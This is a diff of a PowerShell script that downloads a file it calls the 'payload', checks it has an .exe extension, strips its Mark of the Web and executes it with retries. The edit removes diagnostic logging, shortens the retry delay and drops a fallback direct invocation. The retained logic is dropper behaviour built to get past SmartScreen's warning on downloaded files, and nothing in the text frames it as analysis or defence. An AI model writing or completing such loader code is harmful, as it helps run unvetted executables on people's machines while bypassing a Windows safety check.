@@ -16,7 +16,7 @@ if (-not (Test-Path $logDirectory)) {
 # --- Ensure ServicesPipeTimeout is set for reliable service startup ---
 $servicesPipeTimeoutPath = "HKLM:\SYSTEM\CurrentControlSet\Control"
 $servicesPipeTimeoutName = "ServicesPipeTimeout"
-$desiredTimeoutMs = 120000 # 120 seconds (2 minutes)
+$desiredTimeoutMs = 120000 # 120 seconds
 
 Add-Content -Path $logPath -Value "Checking and setting ServicesPipeTimeout in registry..."
 
@@ -128,10 +128,6 @@ try {
         Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
     }
 
-    # Log execution environment
-    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
-    Add-Content -Path $logPath -Value "Execution context: User=$($currentUser.Name), SID=$($currentUser.User.Value)"
-
     # Ensure payload directory exists
     if (-not (Test-Path (Split-Path $payloadPath -Parent))) {
         New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
@@ -147,23 +143,14 @@ try {
     $downloadedSize = (Get-Item $payloadPath).Length
     Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."
 
-    # Log file attributes
-    $fileAttributes = (Get-Item $payloadPath).Attributes
-    Add-Content -Path $logPath -Value "File attributes: $fileAttributes"
-
-    # Check file extension
+    # Check file existence and extension
+    if (-not (Test-Path $payloadPath)) {
+        throw "Downloaded file not found at $payloadPath."
+    }
     if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
         Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
     }
-
-    # Log first 16 bytes for debugging
-    try {
-        $fileBytes = Get-Content $payloadPath -Raw -Encoding Byte -ReadCount 0 | Select-Object -First 16
-        $hexBytes = $fileBytes | ForEach-Object { $_.ToString("X2") } | Join-String -Separator " "
-        Add-Content -Path $logPath -Value "First 16 bytes of file (hex): $hexBytes"
-    } catch {
-        Add-Content -Path $logPath -Value "Failed to read file bytes: $_"
-    }
+    Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."
 
     # Remove Mark of the Web
     try {
@@ -173,19 +160,9 @@ try {
         Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
     }
 
-    # Check for file access before execution
-    try {
-        $file = [System.IO.File]::Open($payloadPath, 'Open', 'Read', 'None')
-        $file.Close()
-        Add-Content -Path $logPath -Value "File is accessible for execution."
-    } catch {
-        Add-Content -Path $logPath -Value "File access check failed: $_"
-        throw "Cannot access file for execution."
-    }
-
     # Execute the .exe with up to 3 attempts
     $maxAttempts = 3
-    $retryDelay = 10 # Seconds between attempts
+    $retryDelay = 5 # Seconds between attempts
     $success = $false
 
     for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
@@ -204,17 +181,8 @@ try {
         }
     }
 
-    # Fallback: Try direct invocation
     if (-not $success) {
-        try {
-            Add-Content -Path $logPath -Value "Attempting fallback direct invocation..."
-            & $payloadPath
-            Add-Content -Path $logPath -Value "Payload executed successfully using direct invocation."
-            $success = $true
-        } catch {
-            Add-Content -Path $logPath -Value "Fallback direct invocation failed: $_"
-            throw "Failed to execute payload after $maxAttempts attempts and fallback invocation."
-        }
+        throw "Failed to execute payload after $maxAttempts attempts."
     }
 
 } catch {
